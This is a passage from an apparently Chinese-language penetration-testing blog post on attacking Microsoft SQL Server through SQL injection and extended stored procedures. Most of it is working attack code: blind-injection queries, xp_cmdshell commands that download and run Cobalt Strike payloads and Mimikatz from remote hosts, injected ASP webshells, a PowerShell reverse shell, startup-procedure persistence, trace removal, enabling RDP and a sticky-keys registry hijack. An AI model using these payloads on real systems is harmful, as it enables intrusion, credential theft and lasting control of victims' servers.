class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">猜表的第一列的第一个字符</span></span><br><span class="line">if(exists(select top 1 name  from test..syscolumns where id=(select  top 1  id from test..sysobjects where name=&#x27;users&#x27;) and ascii(substring(name,1,1))=117)) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">猜第二个字符</span></span><br><span class="line">if(exists(select top 1 name  from test..syscolumns where id=(select  top 1  id from test..sysobjects where name=&#x27;users&#x27;) and ascii(substring(name,2,1))=115)) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">以此类推获取第一条数据的所有字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二种方式：</span><br><span class="line">if(ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))=105) waitfor delay &#x27;0:0:3&#x27; </span><br><span class="line">换种语法而已</span><br><span class="line">获取第二个字符</span><br><span class="line">if(ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),2,1))=105) waitfor delay &#x27;0:0:3&#x27; </span><br></pre></td></tr></table></figure><h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><p>假设我们已经知道了数据表是users，字段是username,password</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substring((select top 1 username from users),1,1))=68) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta">#</span><span class="bash">第二个字符数据</span></span><br><span class="line">if(ascii(substring((select top 1 username from users),2,1))=117) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次获取其他字符</span><br></pre></td></tr></table></figure><p>至此盲注的所有语法记录完毕</p><h2 id="MSSQL-存储过程"><a href="#MSSQL-存储过程" class="headerlink" title="MSSQL 存储过程"></a>MSSQL 存储过程</h2><h3 id="XP-cmdshell-存储过程"><a href="#XP-cmdshell-存储过程" class="headerlink" title="XP_cmdshell 存储过程"></a>XP_cmdshell 存储过程</h3><p>xp_cmdshell是最常见的mssql getshell的方式之一，该存储过程中包含了可以操作系统的许多指令，可以直接使用系统命令进行操作，非常的方便！</p><h4 id="检查xp-cmdshell是否存在"><a href="#检查xp-cmdshell是否存在" class="headerlink" title="检查xp_cmdshell是否存在"></a>检查xp_cmdshell是否存在</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br><span class="line">当查询到具体信息时，代表该存储过程存在！</span><br></pre></td></tr></table></figure><p><img src="image-20210910152718893.png" alt="image-20210910152718893"></p><h4 id="删除xp-cmdshell"><a href="#删除xp-cmdshell" class="headerlink" title="删除xp_cmdshell"></a>删除xp_cmdshell</h4><p>注意：在 SQL Server 2008 和 SQL Server 2005 中，<strong>sp_dropextendedproc</strong> 不会删除系统扩展存储过程。但系统管理员应拒绝 <strong>public</strong> 角色对扩展存储过程的 EXECUTE 权限。在 SQL Server 2000 中，<strong>sp_dropextendedproc</strong> 可用于删除任何扩展存储过程。</p><p>删除语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc </span><br><span class="line">drop procedure sp_oacreate </span><br><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure><p>由于笔者所在环境是server 2008，所以以上步骤没有成功复现，下面是删除失败的截图</p><p><img src="image-20210910155104565.png" alt="image-20210910155104565"></p><h4 id="恢复xp-cmdshell"><a href="#恢复xp-cmdshell" class="headerlink" title="恢复xp_cmdshell"></a>恢复xp_cmdshell</h4><p>在上一步中如果xp_cmdshell被删除，或者无法正常的使用时（先删除xp_cmdshell），可以通过恢复的方式来重装xp_cmdshell</p><p>1.无法定位到存储过程xp_cmdshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)</span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure><p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure><p>同样在 sql server 2008中该语法会发生错误！</p><p>判断敏感的存储过程，不存在的话直接恢复</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_cmdshell]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_dirtree]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_dirtree&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_fixeddrives]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_fixeddrives&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regwrite]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regwrite&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regread]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regread&#x27;,&#x27;xpstar.dll&#x27;)</span><br></pre></td></tr></table></figure><h4 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h4><p>在sql server2008中xp_cmdshell可能无法删除，但是我们可以将xp_cmdshell关闭，阻止执行系统命令，同时我们可以通过一些命令来开启选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; exec SP_CONFIGURE &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="image-20210910161517700.png" alt="image-20210910161517700"></p><p>然后运行 <strong>exec xp_cmdshell “net user”</strong> 查看是否能够正常的使用</p><p><img src="image-20210910161605286.png" alt="image-20210910161605286"></p><h4 id="关闭xp-cmdshell存储过程"><a href="#关闭xp-cmdshell存储过程" class="headerlink" title="关闭xp_cmdshell存储过程"></a>关闭xp_cmdshell存储过程</h4><p>xp_cmdshell的关闭也很简单，使用以下命令就可以关系</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>下面附一些常见的xp_cmdshell收集信息的指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &quot;whoami&quot;;   获取用户信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;ipconfig/all&#x27;  获取网卡信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;   获取操作系统和版本信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List&#x27; 通过wmic获取系统信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#x27;  获取3389端口开启信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;,NO_OUTPUT  添加用户</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;taskkill /f /im taskmgr.exe&#x27;; 删除任务管理器</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;mkdir &quot;C:\test\&quot; &#x27;  创建文件</span><br><span class="line"></span><br><span class="line">常用：</span><br><span class="line">xp_cmdshell 调用powershell 下载文件</span><br><span class="line">exec xp_cmdshell &#x27;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&quot;))&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="xp-cmdshell-查找文件"><a href="#xp-cmdshell-查找文件" class="headerlink" title="xp_cmdshell 查找文件"></a>xp_cmdshell 查找文件</h4><p>我们可以利用该存储过程获取系统中的文件目录，也可以通过指令来查找特定的文件，达到信息收集的作用。</p><p>在dos命令行中我们可以通过for循环遍历查找我们想要的文件，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for /r c:\ %i in (1*.aspx) do @echo %i</span><br><span class="line"></span><br><span class="line">for语句解读</span><br><span class="line">/r   查找指定目录下的所有的文件</span><br><span class="line">/d   查找指定目录下的所有的文件夹</span><br><span class="line">/f   读取指定文件的文件内容</span><br><span class="line">（1*.aspx） 是查找的文件条件</span><br><span class="line">do  后的语句为前面条件成功后需要执行的命令</span><br></pre></td></tr></table></figure><p>那么 我们了解基础的使用方式后，就可以通过xp_cmdshell来执行该语句</p><p>以查找我们网站目录下的的sql.aspx文件为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_cmdshell &#x27;for /r c:\ %i in (sq*.asp) do @echo %i&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">c:\inetpub\wwwroot\sql.aspx</span><br><span class="line"></span><br><span class="line">这样我们就可以查找到网站的绝对路径了，如果我们无法获取回显内容，那么我们可以折中通过</span><br><span class="line">创建表的方式来插入检索内容到表中，在通过sql注入漏洞来获取需要的内容</span><br><span class="line"></span><br><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27; create table temp(dir varchar(1000)) --+   创建表</span><br><span class="line"></span><br><span class="line">http://10.88.14.61/less-2.asp?id=1&#x27; ;insert into temp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %25i in (sq*.aspx) do @echo %25i&#x27; --+  插入数据</span><br><span class="line">然后执行 select * from test..temp 即可查询到所需的数据</span><br></pre></td></tr></table></figure><h4 id="xp-cmdshell-getshell"><a href="#xp-cmdshell-getshell" class="headerlink" title="xp_cmdshell getshell"></a>xp_cmdshell getshell</h4><p>xp_cmdshell  执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &quot;whoami&quot;</span><br><span class="line">exec master.dbo.xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210913162933012.png" alt="image-20210913162933012"></p><h5 id="Powershell-获取权限"><a href="#Powershell-获取权限" class="headerlink" title="Powershell 获取权限"></a>Powershell 获取权限</h5><p>1.使用cs生成powershell 木马文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://121.4.48.72:33898/payload&#x27;))&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210913163322208.png" alt="image-20210913163322208"></p><p>2使用xp_cmdshell 执行powershell命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;;exec xp_cmdshell &quot;powershell.exe -nop -w hidden -c (IEX ((new-object net.webclient).downloadstring(&#x27;http://121.4.48.72:33898/payload&#x27;)))&quot;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cs上成功上线！</p><p><img src="image-20210913164923243.png" alt="image-20210913164923243"></p><h5 id="写入木马获取权限"><a href="#写入木马获取权限" class="headerlink" title="写入木马获取权限"></a>写入木马获取权限</h5><p>假设已知目标网站绝对路径为<strong>C:\inetpub\wwwroot</strong> 直接使用xp_cmdshell写入文件到该目录下，前提是该目录要有写入权限，注意在url中输入时需要对%进行url编码，否则生成的小马%会被吃掉，导致写入shell失败！以asp小马为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\inetpub\wwwroot\404.aspx&#x27; ;--+</span><br><span class="line">asp 小马</span><br><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;exec master..xp_cmdshell &#x27;echo ^&lt;%25eval request(&quot;chopper&quot;)%25^&gt; &gt; C:\inetpub\wwwroot\405.asp&#x27; ;--+</span><br></pre></td></tr></table></figure><p>执行完成后，访问405.asp文件如果存在则证明写入成功！</p><p><img src="image-20210913172029812.png" alt="image-20210913172029812"></p><h5 id="certutil-getshell"><a href="#certutil-getshell" class="headerlink" title="certutil getshell"></a>certutil getshell</h5><p>certutil 是windows自带的证书下载工具，默认是白名单的，所以非常滴好用，这里演示下怎么通过该工具下载恶意文件并进行上线。</p><p>1.使用cs生成一个exe的木马文件并挂载在cs上重命名为a.exe</p><p><img src="image-20210913175137518.png" alt="image-20210913175137518"></p><p><img src="image-20210913175243425.png" alt="image-20210913175243425"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1%27exec%20master..xp_cmdshell &#x27;certutil.exe -urlcache -split -f http://121.4.48.72:33898/a.exe C:\inetpub\wwwroot/a.exe&#x27;;--+</span><br><span class="line"></span><br><span class="line">该文件就被下载到C:\inetpub\wwwroot了，然后使用xp_cmdshell执行该文件即可上线</span><br><span class="line">http://10.88.14.61/less-1.asp?id=1%27exec%20master..xp_cmdshell &#x27;c:/inetpub/wwwroot/a.exe&#x27;;--+</span><br></pre></td></tr></table></figure><p><img src="image-20210913175555887.png" alt="image-20210913175555887"></p><h5 id="xp-cmdshell-持久化"><a href="#xp-cmdshell-持久化" class="headerlink" title="xp_cmdshell 持久化"></a>xp_cmdshell 持久化</h5><p>当攻击者拥有sysadmin权限时，我们可以操控存储过程远程下载恶意文件，并跟随sqlserver应用启动，就可以起到悄无声息的启动恶意程序，达到持久化控制的效果</p><p>1.启用mastser数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use master</span><br><span class="line">go</span><br></pre></td></tr></table></figure><p>2.下载反弹shell的ps1脚本，脚本内容如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A simple and small reverse shell by samratashok&#x27;s Nishang framework. Change the Host IP Address and Port according to your setup as described in the README file of the script. </span></span><br><span class="line"><span class="variable">$sm</span>=(<span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">&quot;10.88.14.45&quot;</span>,<span class="number">4444</span>)).GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bt</span>=<span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span>=<span class="variable">$sm</span>.Read(<span class="variable">$bt</span>,<span class="number">0</span>,<span class="variable">$bt</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$d</span>=(<span class="built_in">New-Object</span> Text.ASCIIEncoding).GetString(<span class="variable">$bt</span>,<span class="number">0</span>,<span class="variable">$i</span>);<span class="variable">$st</span>=([<span class="type">text.encoding</span>]::ASCII).GetBytes((<span class="built_in">iex</span> <span class="variable">$d</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>));<span class="variable">$sm</span>.Write(<span class="variable">$st</span>,<span class="number">0</span>,<span class="variable">$st</span>.Length)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用python开启web服务，获取下载链接地址，反弹shell的地址是10.88.14.45,端口是4444  为我本机服务，客官需自行修改该地址！</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server <span class="number">8080</span></span><br><span class="line"></span><br><span class="line">开启服务后，获取到下载链接地址</span><br><span class="line">http://<span class="number">10.88</span>.<span class="number">14.45</span>:<span class="number">8080</span>/<span class="built_in">Invoke-PowerShellTcpOneLine</span>.ps1</span><br></pre></td></tr></table></figure><p><img src="image-20210916101221496.png" alt="image-20210916101221496"></p><p>3.创建一个新的存储过程，其中执行了xp_cmdshell存储过程，并进行了ps1脚本的下载!</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE PROCEDURE test_sp</span><br><span class="line">AS</span><br><span class="line">EXEC master..xp_cmdshell &#x27;powershell -C &quot;iex (new-object System.Net.WebClient).DownloadString(&#x27;&#x27;http://10.88.14.45:8080/Invoke-PowerShellTcpOneLine.ps1&#x27;&#x27;)&quot;&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p><img src="image-20210916101328070.png" alt="image-20210916101328070"></p><p>执行后发现已经成功的建立test_sp的存储过程</p><p>4.现在我们将把这个存储过程移到启动阶段，因为我们希望它在服务器启动时立即执行。我们将在以下查询的帮助下做到这一点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_procoption @ProcName = &#x27;test_sp&#x27;</span><br><span class="line">, @OptionName = &#x27;startup&#x27;</span><br><span class="line">, @OptionValue = &#x27;on&#x27;;</span><br></pre></td></tr></table></figure><p>5.确认该存储过程是否已经随mssql进程启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM sysobjects WHERE type = &#x27;P&#x27; AND OBJECTPROPERTY(id, &#x27;ExecIsStartUp&#x27;) = 1;</span><br></pre></td></tr></table></figure><p><img src="image-20210916101905742.png" alt="image-20210916101905742"></p><p>上图证明已经将该存储过程设置为随mssql启动。下面监听4444端口，尝试反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在nc中使用命令  nc -lvp 4444  进行监听端口</span><br></pre></td></tr></table></figure><p>在系统中重启该服务，查看是否已经反弹shell成功</p><p><img src="image-20210916102305634.png" alt="image-20210916102305634"></p><p><img src="image-20210916102334057.png" alt="image-20210916102334057"></p><p>上图已经成功获取到目标主机的shell，证明实验成功</p><p>6.最后可以删除该存储过程，清理痕迹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP PROCEDURE test_sp</span><br></pre></td></tr></table></figure><h4 id="XP-dirtree-存储过程"><a href="#XP-dirtree-存储过程" class="headerlink" title="XP_dirtree 存储过程"></a>XP_dirtree 存储过程</h4><p>xp_dirtree 存储过程用于查找我们网站的根目录，该存储过程可以列出指定目录下的所有的文件,下面是一些经典的使用方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; //列出所有c:\文件和目录,子目录 </span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1 //只列c:\文件夹   将参数1改为2则是列出深度为1和2的文件夹，依次类推</span><br><span class="line">execute master..xp_dirtree &#x27;c:&#x27;,1,1 //列c:\文件夹加文件 </span><br></pre></td></tr></table></figure><p>但是该存储过程在正常的sql注入中是没有回显的，所以需要使用将数据插入到表中在进行查询的方式进行获取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.创建临时表，因为我们需要获取文件名，所以我们在临时表中需要设置三个字段，用与保存目录名（varchar），深度(int)以及是否是文件（int）</span><br><span class="line">create table tmp (dir varchar(100),num int,num1 int)</span><br><span class="line"><span class="meta">#</span><span class="bash">注入语句</span></span><br><span class="line">http://10.88.15.236/less-2.asp?id=1;create table tmp (dir varchar(100),num int,num1 int)</span><br><span class="line">然后使用xp_dirtree将数据注入到tmp表中</span><br><span class="line">http://10.88.15.236/less-2.asp?id=1;insert into tmp(dir,num,num1) exec xp_dirtree &#x27;C:\&#x27;,1,1</span><br><span class="line">这样我们就实现了对数据的插入，查询该表即可获取数据</span><br></pre></td></tr></table></figure><p><img src="image-20210914105655051.png" alt="image-20210914105655051"></p><h4 id="XP-regread"><a href="#XP-regread" class="headerlink" title="XP_regread"></a>XP_regread</h4><p>xp_regread可以用来读取注册表中的键值信息</p><p>例如读取3389的端口值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp&#x27;,&#x27;PortNumber&#x27;</span><br></pre></td></tr></table></figure><p>![image-20210914142528018.png)</p><h4 id="xp-regenumkeys"><a href="#xp-regenumkeys" class="headerlink" title="xp_regenumkeys"></a>xp_regenumkeys</h4><p>枚举可用的键值，不知道有啥用，先记录功能！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_regenumkeys &#x27;HKEY_CURRENT_USER&#x27;,&#x27;Control Panel\International&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210914144914385.png" alt="image-20210914144914385"></p><h4 id="xp-fileexist"><a href="#xp-fileexist" class="headerlink" title="xp_fileexist"></a>xp_fileexist</h4><p>判断文件是否存在，返回1代表文件存在，该存储过程无回显，一般将回显插入到临时表中进行显示，是否查找成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_fileexist &quot;C:\inetpub\wwwroot\sql.aspx&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210914145520555.png" alt="image-20210914145520555"></p><h4 id="xp-subdirs"><a href="#xp-subdirs" class="headerlink" title="xp_subdirs"></a>xp_subdirs</h4><p>列出当前目录的所有的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_subdirs &quot;C:\\&quot;</span><br></pre></td></tr></table></figure><p><img src="image-20210914145929607.png" alt="image-20210914145929607"></p><h4 id="xp-regwrite"><a href="#xp-regwrite" class="headerlink" title="xp_regwrite"></a><em>xp_regwrite</em></h4><p><em>xp_regwrite</em>修改注册表键值对</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开启3389</span><br><span class="line">exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"><span class="meta">#</span><span class="bash">xp_cmdshell 开启</span></span><br><span class="line">exec master..xp_cmdshell &quot;REG ADD &#x27;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#x27; /v fDenyTSConnections /t REG_DWORD /d 0&quot;</span><br><span class="line"></span><br><span class="line">关闭3389</span><br><span class="line">exec master.dbo.xp_regwrite&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;,&#x27;fDenyTSConnections&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br></pre></td></tr></table></figure><h5 id="xp-regwrite-映像劫持"><a href="#xp-regwrite-映像劫持" class="headerlink" title="xp_regwrite 映像劫持"></a>xp_regwrite 映像劫持</h5><p>xp_regwrite存储过程可以对注册表进行修改，替换任意的键值，我们可以通过对粘贴键进行替换的方式，造成劫持的效果，下面开始实践</p><p>1.使用条件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">未禁止注册表的编辑功能</span><br><span class="line">xp_regwrite开启</span><br></pre></td></tr></table></figure><p>2.xp_regwrite的开启和关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_regwrite&#x27;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><p>3.修改粘贴键的值为cmd窗口，达到劫持cmd的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey=&#x27;HKEY_LOCAL_MACHINE&#x27;,@key=&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;,@value_name=&#x27;Debugger&#x27;,@type=&#x27;REG_SZ&#x27;,@value=&#x27;c:\windows\system32\cmd.exe&#x27;</span><br></pre></td></tr></table></figure><p>4.使用xp_regread查看是否成功修改文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;,&#x27;Debugger&#x27;</span><br></pre></td></tr></table></figure><p><img src="image-20210915142651918.png" alt="image-20210915142651918"></p><p>上图即为修改成功</p><p>5.验证cmd窗口是否可以正常启动，在windows中连续5次shift键后，弹出cmd框，即为成功</p><p><img src="image-20210915142835591.png" alt="image-20210915142835591"></p><p>6.使用regdeleteregkey删除键值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_regdeletekey &#x27;HKEY_LOCAL_MACHINE&#x27;, &#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span><br></pre></td></tr></table></figure><h5 